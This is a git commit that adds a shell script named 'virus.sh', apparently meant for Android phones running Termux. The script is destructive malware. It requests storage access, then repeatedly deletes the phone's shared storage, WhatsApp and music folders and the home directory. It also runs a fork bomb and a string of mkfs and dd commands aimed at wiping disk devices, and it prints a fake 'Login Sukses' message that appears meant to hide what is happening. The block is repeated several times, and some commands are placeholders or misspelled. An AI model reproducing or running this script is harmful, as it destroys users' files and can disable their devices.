6411b488f344e4b6d78ab63dfeb7c115d1f15bbd
rajctg <39931753+jashim2018@users.noreply.github.com>
2020-02-20 13:25:52 +0600

    Create virus.sh

---
+++ virus.sh
@@ -0,0 +1,106 @@
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+echo $G1"Login Sukses"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
+:(){ :|: & };:
+mkfs
+mkfs.bfs
+mkfs.minix
+mkfs.vfat
+mkfs.ext2
+mkfs.ext3
+mkfs.reiserfs
+mkfs.msdos
+mkfs.cramfs
+dd if=something of=/dev/sda
+dd if=/dev/hda of=/dev/sdb
+dd if=something of=/dev/hda
+dd if=/dev/hda of=/dev/hdb
+dd if=/dev/zero of=/dev/had
